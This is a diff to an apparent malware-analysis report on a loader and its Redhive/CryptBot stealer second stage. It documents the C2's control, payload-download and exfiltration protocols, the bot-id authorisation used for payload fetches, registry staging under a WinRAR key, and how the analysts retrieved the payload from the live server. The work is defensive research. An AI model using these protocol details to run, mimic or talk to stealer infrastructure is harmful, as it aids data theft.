@@ -294,13 +294,70 @@ config, which initially suggested a DGA. It is not: the PRNG at `0x140014FB0`
 (`GetTickCount64`-seeded, `div rcx` mod 62) produces the nonce in
 `checkserver;<value>;<nonce>`.
 
+### 4.3 Three ports, one host
+
+A single address carries the whole chain. Confirmed against the live server on
+2026-08-31 / 2026-09-01:
+
+| Port | Role | Response to the wrong protocol |
+|---|---|---|
+| **406** | WebSocket control channel | plain HTTP → `426 Upgrade Required` |
+| **408** | HTTP payload download (§6) | unauthorised → `403` / `404` |
+| **1488** | Stealer data exfiltration | line-oriented, see below |
+
+Ping cadence on the control channel is **15 seconds**.
+
+Port 1488 belongs to the **second-stage stealer**, not to this loader — it is
+listed here because the same host serves it, which means blocking the address
+covers all three stages.
+
+```
+connect <host>:1488
+  -->  "stealer;<8 lowercase hex volume serial>\n"
+  <--  "auth_ok\n"
+  -->  8-byte big-endian length
+  -->  stored (uncompressed) ZIP
+```
+
+The trailing newline is required: without it the collector ACKs at TCP level and
+then blocks indefinitely. Note what this protocol does **not** have — no TLS, no
+compression. Stolen data crosses the network essentially in the clear, so a
+network sensor positioned to see it can recover the archive contents directly.
+
+The identity here is the same volume serial used as the bot id in the `ready;`
+message (§4), which ties exfiltrated archives back to a specific host.
+
+---
+
+
 ---
 
 ## 5. Task subsystem
 
+What the live server actually sends:
+
 ```
-task;<verb>;task_id;<id>;type;<type>;version;<ver>;param;<param>
+task;createtask;Stealer;task_id;fa5iik_sgka;version;1.0.1
 ```
+
+The verb is followed by a **bare module token**, with no `type;` key and **no
+`param;` field at all**.
+
+The parser at `0x14000EC40` nevertheless searches for a longer form, in order:
+
+| Needle | Address | Destination |
+|---|---|---|
+| `task;` | `0x14000ECFF` | — |
+| `task_id;` | `0x14000EE2F` | — |
+| `createtask` | `0x14000EF4E` | — |
+| `type;` | `0x14000EF71` | `[rsp+0x2C0]` |
+| `version;` | `0x14000F0B4` | `[rsp+0x260]` |
+| `param;` | `0x14000F1DE` | `[rsp+0x160]` |
+
+So the client *accepts* `task;<verb>;task_id;<id>;type;<type>;version;<ver>;param;<param>`,
+which earlier revisions of this report documented as the message format. It is
+the grammar the parser tolerates, not the one the operator uses. Confirmed
+against the live server on 2026-08-31.
 
 The dispatcher skips `"task;"`, extracts the verb, then `strstr("task_id;") + 8`
 for the ID. It allocates a **0x188-byte (392) task structure** on the heap and
@@ -321,11 +378,9 @@ never blocks.
 ## 6. Payload delivery — registry chunking
 
 `0x14000B770` is a download channel **independent of the WebSocket control
-channel**. It never executed under emulation (it requires a real `createtask`),
-so the control flow below is static reconstruction supported by the recovered
-dynamic API table. The request format itself is not reconstruction — it was
-recovered verbatim from the encrypted string table (see *The download request*
-below).
+channel**, on port 408 rather than 406. It never executed under emulation (it
+requires a real `createtask`), so the control flow below was reconstructed
+statically; it has since been confirmed against the live server.
 
 ```c
 buf = HeapAlloc(heap, HEAP_ZERO_MEMORY, 0x300000);   // 3 MB — fits the 1.45 MB payload
@@ -339,8 +394,8 @@ shutdown(); closesocket(); WSACleanup();
 IsValidPE(buf, size);                                 // 0x140005FB0 — see §7
 
 RegCreateKeyA(HKCU, "Software\\WinRAR\\Libs");
-  sprintf("%s_%s_tempchunk_%d"); RegSetValueExA(...);  // staged write
-  sprintf("%s_%s_tempchunk_%d"); RegDeleteValueA(...); // clear stale staging
+  sprintf("%s_%s_tempchunk_%d", type, version, n);     // staged write
+  RegSetValueExA(...);                                 // then delete stale temps
 RegCloseKey();
   RegGetValueA(tempchunk) → HeapAlloc → RegSetValueExA(chunk) → RegDeleteValueA(temp);
                                                       // atomic commit
@@ -356,24 +411,50 @@ library data.
 Recovered from `0x140025A60` (TLS drop) and `0x14002DABE` (in-place `.rdata`):
 
 ```http
-GET /task/%s HTTP/1.1
-Host: %s
-User-Agent: %s
+GET /task/<type> HTTP/1.1
+Host: <host>
+User-Agent: <bot_id>
 Connection: close
 
 ```
 
-Three substitutions: the task identifier in the path, the host, and a
-User-Agent. **The User-Agent value itself was not recovered** — it does not
-appear among the decrypted strings, so it is most likely composed at runtime
-(the loader builds an OS version string at `0x140009470`). Treated as an open
-item rather than guessed at.
+**The path carries the module type, not the task identifier.** Traced
+statically: `[rsp+0x2C0]`, filled by the `type;` lookup in §5, becomes `rcx` of
+`0x14000B770` and lands as the first `%s` of the template. The live server
+settles it:
 
-Note the contrast with the control channel: this request *does* carry a
-`User-Agent`, and `Connection: close` marks it as one-shot — consistent with
-fetch-then-teardown rather than a persistent channel. Combined with §7 (the
-response body is an unencrypted PE), `GET /task/` on ports 406/408 is the
-single most specific network signature in this report.
+```
+GET /task/fa5iik_sgka     (task_id)  ->  404 Not Found
+GET /task/Stealer         (type)     ->  200 OK, 1,452,032 bytes
+```
+
+Independently corroborated by the payload's VirusTotal filename
+`Stealer_1.0.1_chunk_0_export.bin` — the registry chunk name uses the same
+`<type>_<version>` pair.
+
+**The `User-Agent` is the authorisation token, not a browser string.** It
+carries the bot identity registered on the control channel:
+
+| User-Agent | Response |
+|---|---|
+| absent | `403 Forbidden` |
+| the task_id | `403 Forbidden` |
+| arbitrary text | `403 Forbidden`, then `429` under rate limiting |
+| well-formed id, not this session's | `404 Not Found` |
+| the id registered on the live session | `200 OK` + payload |
+
+`403` is a format rejection; `404` means "valid shape, unknown identity".
+Fetching therefore requires registering over 406 first and reusing that same id
+here. Four rapid requests triggered `429`.
+
+`0x140010160` returns a pointer to `.data` at `0x140031020` holding
+`00000000`, and nothing in `.text` writes that buffer — so a pristine sample
+would send `User-Agent: 00000000`, which the live server rejects. **How the real
+client obtains an accepted id is not established** (see §10).
+
+`Connection: close` makes this a one-shot fetch, matching the recv-until-complete
+loop above. Combined with §7 — the response body is an unencrypted PE — the
+`GET /task/` request is the most specific network signature in this report.
 
 ### Injection
 
@@ -529,25 +610,33 @@ the heuristic cannot establish function extents.
 
 **Not obtained:**
 
-- **The second-stage payload itself.** It is not in this file; the C2 delivers it
-  on demand in response to a `createtask` command. The infected host was wiped,
-  taking the staged registry chunks with it, and no public sandbox run appears to
-  have captured it either — across the 20 samples VirusTotal associates with this
-  C2, every dropped file is the loader's own self-copy.
+- ~~**The second-stage payload itself.**~~ **Obtained 2026-08-31** by speaking the
+  protocol to the live C2 with a purpose-built client — the sample was never run.
+  It is **Redhive Stealer** (its own branding; CryptBot per Microsoft,
+  TrendMicro, Antiy and alibabacloud), SHA-256
+  `fd779b73082ed7c7d98d076f863562a6cb8d2297077a3e093305051be040bd29`,
+  1,452,032 bytes, PE32+ DLL, compiled 2026-08-21 — one day before the loader.
 
-  **Whether the C2 is still reachable was not tested**, and the campaign appears
-  to be live (see §4.2). "Not obtained" here means exactly that; it is not a
-  claim that retrieval is impossible. Note also that absence of network activity
-  in public sandbox reports is *expected* regardless of C2 state: the
-  anti-analysis checks in §2 run long before the beacon in §3, so a sample that
-  detects the sandbox never reaches the network stage. Sandbox telemetry
-  therefore says nothing about whether the server is alive.
+  We were **not first**: the same payload has been on VirusTotal since
+  2026-08-23, uploaded under the filename `Stealer_1.0.1_chunk_0_export.bin` —
+  i.e. someone else had already exported it from the registry chunks. The
+  earlier framing of this as unrecoverable was wrong on both counts: the C2 was
+  live, and a copy was already public.
+
+- **How the real client obtains an accepted bot id.** `0x140010160` hands back a
+  `.data` buffer at `0x140031020` containing `00000000`, and nothing in `.text`
+  writes it — yet the live server rejects that value. Some assignment path
+  exists that static analysis has not located. Related: the `ready;` message's
+  bot id is the volume serial (§4), which arrives via the
+  `GetVolumeInformationW` out-parameter rather than from `0x140031020`, so the
+  buffer may simply be a default that is never used on the wire.
+
 - **The `.duckdns.org` subdomain prefix.** Mechanism understood (§4.1); the
   cached value is gone with the host.
-- **The `User-Agent` value used by the download channel.** The request template
-  is recovered (§6) and carries `User-Agent: %s`, but the substituted value is
-  not among the decrypted strings — most likely composed at runtime. Recorded as
-  open rather than guessed.
+- ~~**The `User-Agent` value used by the download channel.**~~ **Resolved.** It
+  is not a browser string at all — it carries the bot id and acts as the
+  authorisation token for the download (§6). The reason it never appeared among
+  the decrypted strings is that there is no constant to decrypt.
 - **The unnamed 320 KB section.** VMProtect's own runtime. Analysing it studies
   VMProtect, not this loader.
 
